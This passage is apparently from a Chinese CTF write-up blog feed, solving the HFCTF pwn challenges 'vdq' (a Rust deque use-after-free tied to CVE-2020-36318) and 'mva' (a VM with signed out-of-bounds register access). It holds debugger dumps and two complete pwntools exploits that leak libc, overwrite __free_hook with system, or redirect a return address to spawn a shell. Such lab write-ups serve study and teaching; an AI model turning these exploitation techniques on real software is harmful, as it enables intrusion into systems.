class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5A</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A</span><br><span class="line">Aa</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8A</span><br><span class="line">Aa0A</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2</span><br></pre></td></tr></table></figure><p>拿到的一个比较好看的poc，之后的exp也是基于它编写</p><p>看看View的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">  core::fmt::Arguments::new_v1::h44adc30b070cf8c4(</span><br><span class="line">    &amp;v43,</span><br><span class="line">    (___str_)__PAIR128__(<span class="number">1LL</span>, &amp;off_7BBC0),</span><br><span class="line">    (__core::fmt::ArgumentV1_)((<span class="keyword">unsigned</span> __int64)&amp;needle.data_ptr + <span class="number">7</span>));</span><br><span class="line">  <span class="built_in">std</span>::io::stdio::_print::h0d31d4b9faa6e1ec();</span><br><span class="line">  alloc::collections::vec_deque::VecDeque$LT$T$GT$::make_contiguous::he6debc29b2205434(</span><br><span class="line">    (_mut__alloc::boxed::Box&lt;vdq::Note&gt;_ *)&amp;notes,</span><br><span class="line">    (alloc::collections::vec_deque::VecDeque&lt;alloc::boxed::Box&lt;vdq::Note&gt;&gt; *)&amp;off_7BBC0);</span><br><span class="line">  p_notes = (<span class="keyword">unsigned</span> __int64)&amp;notes;</span><br><span class="line">  alloc::collections::vec_deque::VecDeque$LT$T$GT$::iter::h0cc194c5561ce1ed(&amp;v44, &amp;notes);</span><br><span class="line">  core::iter::traits::iterator::Iterator::for_each::h73567d402a60c07d(v10, (vdq::handle_opr_lst::closure_0)&amp;v44);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>看不懂，这里分别搜索<code>print</code>，<code>iterator::for_each</code>，<code>make_contiguous</code>的vulnerability，搜到了 CVE-2020-36318. 根据容器的结构继续分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000 alloc::collections::vec_deque::VecDeque&lt;alloc::boxed::Box&lt;vdq::Note&gt;&gt; struc ; (sizeof=0x20, align=0x8, copyof_185)</span><br><span class="line">00000000                                         ; XREF: _ZN3vdq14handle_opr_lst17h7fb2393547b96358E/r</span><br><span class="line">00000000 tail            dq ?</span><br><span class="line">00000008 head            dq ?</span><br><span class="line">00000010 buf             alloc::raw_vec::RawVec&lt;alloc::boxed::Box&lt;vdq::Note&gt;,alloc::alloc::Global&gt; ?</span><br><span class="line">00000010                                         ; XREF: vdq::handle_opr_lst::h7fb2393547b96358:loc_DC0C/o</span><br><span class="line">00000020 alloc::collections::vec_deque::VecDeque&lt;alloc::boxed::Box&lt;vdq::Note&gt;&gt; ends</span><br><span class="line">00000020</span><br></pre></td></tr></table></figure><p>通过调试可以发现，deque的初始容量是4，当容器满后，capacity会翻倍，tail指向低地址尾部，head指向高地址头部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/3xg $rdi</span><br><span class="line">0x7ffc94dee2a0: 0x0000000000000000      0x0000000000000002</span><br><span class="line">0x7ffc94dee2b0: 0x000055c3e6e5ffa0</span><br><span class="line"></span><br><span class="line">gef➤  x/4xg 0x7ffc94dee2a0</span><br><span class="line">0x7ffc94dee2a0: 0x0000000000000000      0x0000000000000004</span><br><span class="line">0x7ffc94dee2b0: 0x000055c3e6e600f0      0x0000000000000008</span><br></pre></td></tr></table></figure><p>同时可以发现，pop之后，容器对应的index不会立刻清除，而是移动了tail</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/4xg $rdi</span><br><span class="line">0x7ffe849e3740: 0x0000000000000001      0x0000000000000003</span><br><span class="line">0x7ffe849e3750: 0x00005607f06c2fb0      0x0000000000000004</span><br><span class="line">gef➤  x/16xg 0x00005607f06c2fb0</span><br><span class="line">0x5607f06c2fb0: 0x00005607f06c2fe0      0x00005607f06c3030</span><br><span class="line">0x5607f06c2fc0: 0x00005607f06c3080      0x0000000000000000</span><br></pre></td></tr></table></figure><p>调试poc，观察view前后的变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/16xg 0x007ffc84bda940</span><br><span class="line">0x7ffc84bda940: 0x0000000000000002      0x0000000000000001</span><br><span class="line">0x7ffc84bda950: 0x0000555a63576f80      0x0000000000000004</span><br><span class="line">0x7ffc84bda960: 0x0000000000000008      0x0000000000000000</span><br><span class="line">0x7ffc84bda970: 0x0000000000000000      0x0000000000000005</span><br><span class="line">0x7ffc84bda980: 0x0000555a63576ea0      0x0000000000000010</span><br><span class="line">0x7ffc84bda990: 0x0000555a63576ea0      0x0000555a63576eaa</span><br><span class="line">0x7ffc84bda9a0: 0x0000555a63576ea0      0x0000000000000010</span><br><span class="line">0x7ffc84bda9b0: 0x000000000000000a      0x0000555a63576ea0</span><br><span class="line">gef➤  x/16xg 0x0000555a63576f80</span><br><span class="line">0x555a63576f80: 0x0000555a63577020      0x0000555a63577020</span><br><span class="line">0x555a63576f90: 0x0000555a63577070      0x0000555a63576fd0</span><br><span class="line"></span><br><span class="line">gef➤  x/16xg 0x007ffc84bda940</span><br><span class="line">0x7ffc84bda940: 0x0000000000000001      0x0000000000000004</span><br><span class="line">0x7ffc84bda950: 0x0000555a63576f80      0x0000000000000004</span><br><span class="line">0x7ffc84bda960: 0x0000000000000008      0x0000000000000000</span><br><span class="line">0x7ffc84bda970: 0x0000000000000000      0x0000000000000005</span><br><span class="line">0x7ffc84bda980: 0x0000555a63576ea0      0x0000000000000010</span><br><span class="line">0x7ffc84bda990: 0x0000555a63576ea0      0x0000555a63576eaa</span><br><span class="line">0x7ffc84bda9a0: 0x0000555a63576ea0      0x0000000000000010</span><br><span class="line">0x7ffc84bda9b0: 0x000000000000000a      0x0000555a63576ea0</span><br><span class="line">gef➤  x/16xg 0x0000555a63576f80</span><br><span class="line">0x555a63576f80: 0x0000555a63577020      0x0000555a63577070</span><br><span class="line">0x555a63576f90: 0x0000555a63576fd0      0x0000555a63577020</span><br><span class="line">0x555a63576fa0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555a63576fb0: 0x0000000000000a61      0x0000000000000000</span><br><span class="line">0x555a63576fc0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x555a63576fd0: 0x0000000000000001      0x0000000000000004</span><br><span class="line">0x555a63576fe0: 0x0000555a63576fb0      0x0000000000000008</span><br><span class="line">0x555a63576ff0: 0x0000000000000001      0x0000000000000021</span><br><span class="line">gef➤  </span><br><span class="line"></span><br><span class="line">gef➤  x/16xg 0x007ffc84bda940</span><br><span class="line">0x7ffc84bda940: 0x0000000000000002      0x0000000000000004</span><br><span class="line">0x7ffc84bda950: 0x0000555a63576f80      0x0000000000000004</span><br><span class="line">0x7ffc84bda960: 0x0000000000000008      0x0000000000000000</span><br><span class="line">0x7ffc84bda970: 0x0000000000000000      0x0000000000000005</span><br><span class="line">0x7ffc84bda980: 0x0000555a63576ea0      0x0000000000000010</span><br><span class="line">0x7ffc84bda990: 0x0000555a63576ea0      0x0000555a63576eaa</span><br><span class="line">0x7ffc84bda9a0: 0x0000555a63576ea0      0x0000000000000010</span><br><span class="line">0x7ffc84bda9b0: 0x000000000000000a      0x0000555a63576ea0</span><br><span class="line">gef➤  x/16xg 0x0000555a63576f80</span><br><span class="line">0x555a63576f80: 0x0000555a63577020      0x0000555a63577070</span><br><span class="line">0x555a63576f90: 0x0000555a63576fd0      0x0000555a63577020</span><br><span class="line">0x555a63576fa0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555a63576fb0: 0x0000000000000a61      0x0000000000000000</span><br><span class="line">0x555a63576fc0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x555a63576fd0: 0x0000000000000001      0x0000000000000004</span><br><span class="line">0x555a63576fe0: 0x0000555a63576fb0      0x0000000000000008</span><br><span class="line">0x555a63576ff0: 0x0000000000000001      0x0000000000000021</span><br><span class="line">gef➤  </span><br><span class="line"></span><br><span class="line">gef➤  x/16xg 0x007ffc84bda940</span><br><span class="line">0x7ffc84bda940: 0x0000000000000002      0x0000000000000001</span><br><span class="line">0x7ffc84bda950: 0x0000555a63576f80      0x0000000000000004</span><br><span class="line">0x7ffc84bda960: 0x0000000000000008      0x0000000000000000</span><br><span class="line">0x7ffc84bda970: 0x0000000000000000      0x0000000000000006</span><br><span class="line">0x7ffc84bda980: 0x0000555a63576ea0      0x0000000000000010</span><br><span class="line">0x7ffc84bda990: 0x0000555a63576ea0      0x0000555a63576eaa</span><br><span class="line">0x7ffc84bda9a0: 0x0000555a63576ea0      0x0000000000000010</span><br><span class="line">0x7ffc84bda9b0: 0x000000000000000a      0x0000555a63576ea0</span><br><span class="line">gef➤  x/16xg 0x0000555a63576f80</span><br><span class="line">0x555a63576f80: 0x0000555a63577020      0x0000555a63577070</span><br><span class="line">0x555a63576f90: 0x0000555a63576fd0      0x0000555a63577020    # 出现两个一样的地址</span><br><span class="line">0x555a63576fa0: 0x0000555a63577070      0x0000000000000021</span><br><span class="line">0x555a63576fb0: 0x0000000000000a61      0x0000000000000000</span><br><span class="line">0x555a63576fc0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x555a63576fd0: 0x0000000000000001      0x0000000000000004</span><br><span class="line">0x555a63576fe0: 0x0000555a63576fb0      0x0000000000000008</span><br><span class="line">0x555a63576ff0: 0x0000000000000001      0x0000000000000021</span><br><span class="line">gef➤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>综上（虽然不知道漏洞具体的细节）但是我们可以得到利用策略如下</p><ul><li>UaF一个大chunk，View得到libcbase，freehook，system等等地址</li><li>再次UaF，利用输入时的<code>get_raw_line</code>会申请一块地址存放输入数据的特性，控制大小，申请到一个<code>vdq::Note</code>（并且由于UaF，这个Note现在处于使用中），修改掉对应的buffer的地址到freehook上，注意要加一个偏移量，因为append会在buffer的后面添加数据，让buffer的末尾刚好在freehook就行</li><li>使用Append，修改freehook为system，然后随便使用一个会调用<code>get_raw_line</code>的功能，输入/bin/sh即可。</li></ul><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./vdq&quot;</span>)</span><br><span class="line"></span><br><span class="line">op = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[</span></span><br><span class="line"><span class="string">    &quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Remove&quot;, &quot;View&quot;,</span></span><br><span class="line"><span class="string">    &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Append&quot;, &quot;Append&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;View&quot;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Remove&quot;, &quot;View&quot;, UaF a big chunk</span></span><br><span class="line"><span class="comment"># &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Append&quot;, &quot;Append&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;View&quot;</span></span><br><span class="line"><span class="comment"># Add:    create new note at index 1(UaF index 0)</span></span><br><span class="line"><span class="comment"># Remove: Remove index 0</span></span><br><span class="line"><span class="comment"># Append: use append to allocate vdq::Note(at index 1) from tcache</span></span><br><span class="line"><span class="comment">#         change the buffer pointer</span></span><br><span class="line"><span class="comment"># Append: append again to write freehook</span></span><br><span class="line"><span class="comment"># Add:    profit</span></span><br><span class="line"></span><br><span class="line">sh.send(op.encode())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x1</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;b&quot;</span>*<span class="number">0x1</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;c&quot;</span>*<span class="number">0x1</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;d&quot;</span>*<span class="number">0x1</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x800</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;Removed note [5]&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;-&gt; &quot;</span>)</span><br><span class="line">ret = sh.recv(<span class="number">12</span>).decode()</span><br><span class="line">addr = ret[-<span class="number">2</span>:]+ret[-<span class="number">4</span>:-<span class="number">2</span>]+ret[-<span class="number">6</span>:-<span class="number">4</span>]+ret[-<span class="number">8</span>:-<span class="number">6</span>]+ret[-<span class="number">10</span>:-<span class="number">8</span>]+ret[-<span class="number">12</span>:-<span class="number">10</span>]</span><br><span class="line">addr = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;leak addr: &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">libcaddr = addr - <span class="number">0x3ebca0</span></span><br><span class="line">freehook = libcaddr + <span class="number">0x3ed8e8</span></span><br><span class="line">freehook_offset = freehook - <span class="number">0x2a</span> <span class="comment"># offset</span></span><br><span class="line">system = libcaddr + <span class="number">0x4f420</span></span><br><span class="line">log.success(<span class="string">&quot;libc addr: &quot;</span> + <span class="built_in">hex</span>(libcaddr))</span><br><span class="line">log.success(<span class="string">&quot;freehook: &quot;</span> + <span class="built_in">hex</span>(freehook))</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>) <span class="comment"># to tcache[0x340]</span></span><br><span class="line">sh.sendline(p64(freehook_offset) * <span class="number">3</span> + p64(<span class="number">0</span>))</span><br><span class="line">sh.sendline(p64(system))</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="mva">mva</h2><p>给定的程序实现了一个vm，指令长度4 bytes，可以发现，在<code>mul</code>时没有检测操作数大小，导致越界读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xD</span>u:</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(instruction) &gt;= <span class="number">6u</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)instruction &gt;= <span class="number">6u</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  reg[SBYTE2(instruction)] = reg[SBYTE1(instruction)] * reg[(<span class="keyword">char</span>)instruction];</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsx   eax, [rbp+var_249]</span><br></pre></td></tr></table></figure><p>从汇编可以看出，可以传入负数，然后读出栈上的其它数据，然后再看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xE</span>u:</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(instruction) &gt;= <span class="number">6u</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(instruction) &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  reg[SBYTE1(instruction)] = reg[SBYTE2(instruction)];</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这里对第一个操作数的大小检查带符号，所以可以用负数绕过，达到越界写，这样我们可以覆盖虚拟机栈指针，虽然这只能写入一个负数，但是通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     [rbp+rax*2+stack], dx</span><br></pre></td></tr></table></figure><p>rax*2可以引发整数溢出，再次把数值变为正数，从而将虚拟机栈顶指向返回地址，完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>(<span class="params">reg, val</span>):</span></span><br><span class="line">    command = p8(<span class="number">0x01</span>) + p8(reg) + p8(val &gt;&gt; <span class="number">8</span>) + p8(val &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">reg, op1, op2</span>):</span></span><br><span class="line">    command = p8(<span class="number">0x02</span>) + p8(reg) + p8(op1) + p8(op2)</span><br><span class="line">    <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">reg, op1, op2</span>):</span></span><br><span class="line">    command = p8(<span class="number">0x03</span>) + p8(reg) + p8(op1) + p8(op2)</span><br><span class="line">    <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">reg, op1, op2</span>):</span></span><br><span class="line">    command = p8(<span class="number">0x0D</span>) + p8(reg) + p8(op1) + p8(op2)</span><br><span class="line">    <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span>(<span class="params">reg, op1, op2</span>):</span></span><br><span class="line">    command = p8(<span class="number">0x0E</span>) + p8(op2) + p8(op1) + p8(op2)</span><br><span class="line">    <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span>():</span></span><br><span class="line">    command = p8(<span class="number">0x09</span>) + p8(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span>():</span></span><br><span class="line">    command = p8(<span class="number">0x0A</span>) + p8(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>():</span></span><br><span class="line">    command = p8(<span class="number">0xf</span>) + p8(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (~(num-<span class="number">1</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">payload  = load(<span class="number">0</span>, <span class="number">0x1</span>)              <span class="comment"># reg[0] = 0x1</span></span><br><span class="line">payload += mul(<span class="number">0</span>, inverse(<span class="number">124</span>), <span class="number">0</span>)   <span class="comment"># reg[0] = reg[-124] * reg[0]</span></span><br><span class="line"></span><br><span class="line">payload += load(<span class="number">0</span>, <span class="number">0x1</span>)              <span class="comment"># reg[0] = 0x1</span></span><br><span class="line">payload += mul(<span class="number">0</span>, inverse(<span class="number">122</span>//<span class="number">2</span>), <span class="number">0</span>)<span class="comment"># reg[0] = reg[-125] * reg[0]</span></span><br><span class="line">payload += load(<span class="number">2</span>, <span class="number">0x0006</span>)           <span class="comment"># reg[2] = 0x0011</span></span><br><span class="line">payload += add(<span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>)              <span class="comment"># reg[1] = reg[0] + reg[2]</span></span><br><span class="line"></span><br><span class="line">payload += load(<span class="number">0</span>, <span class="number">0x1</span>)              <span class="comment"># reg[0] = 0x1</span></span><br><span class="line">payload += mul(<span class="number">0</span>, inverse(<span class="number">124</span>//<span class="number">2</span>), <span class="number">0</span>)<span class="comment"># reg[0] = reg[-126] * reg[0]</span></span><br><span class="line">payload += load(<span class="number">3</span>, <span class="number">0xf567</span>)           <span class="comment"># reg[3] = 0x9b72</span></span><br><span class="line">payload += add(<span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>)              <span class="comment"># reg[2] = reg[0] + reg[3]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += pop()</span></span><br><span class="line">payload += load(<span class="number">0</span>, <span class="number">0x8000</span>)           <span class="comment"># reg[0] = 0x8000</span></span><br><span class="line">payload += mov(<span class="number">0</span>, inverse(<span class="number">0x07</span>), <span class="number">0</span>)  <span class="comment"># reg[-0x07] = reg[0]</span></span><br><span class="line">payload += load(<span class="number">0</span>, <span class="number">0</span>)                <span class="comment"># reg[0] = 0</span></span><br><span class="line">payload += mov(<span class="number">0</span>, inverse(<span class="number">0x08</span>), <span class="number">0</span>)  <span class="comment"># reg[-0x08] = reg[0]</span></span><br><span class="line">payload += load(<span class="number">0</span>, <span class="number">0</span>)                <span class="comment"># reg[0] = 0</span></span><br><span class="line">payload += mov(<span class="number">0</span>, inverse(<span class="number">0x09</span>), <span class="number">0</span>)  <span class="comment"># reg[-0x09] = reg[0]</span></span><br><span class="line">payload += load(<span class="number">0</span>, <span class="number">0x010c</span>)           <span class="comment"># reg[0] = 0x10c</span></span><br><span class="line">payload += mov(<span class="number">0</span>, inverse(<span class="number">0x0a</span>), <span class="number">0</span>)  <span class="comment"># reg[-0x0a] = reg[0]</span></span><br><span class="line"></span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>)              <span class="comment"># reg[0] = reg[2]</span></span><br><span class="line">payload += push()                    <span class="comment"># push reg[0]</span></span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)              <span class="comment"># reg[0] = reg[1]</span></span><br><span class="line">payload += push()                    <span class="comment"># push reg[0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x1ed6a0 0x845ca</span></span><br><span class="line"></span><br><span class="line">payload += (<span class="number">0x100</span> - <span class="built_in">len</span>(payload)) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;HFCTF&lt;/h1&gt;
&lt;p&gt;没空去结束了之后简单做了一下pwn&lt;/p&gt;
&lt;!-- TOC --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#hfctf&quot;&gt;HFCTF&lt;/a&gt;
&lt;ul&gt;
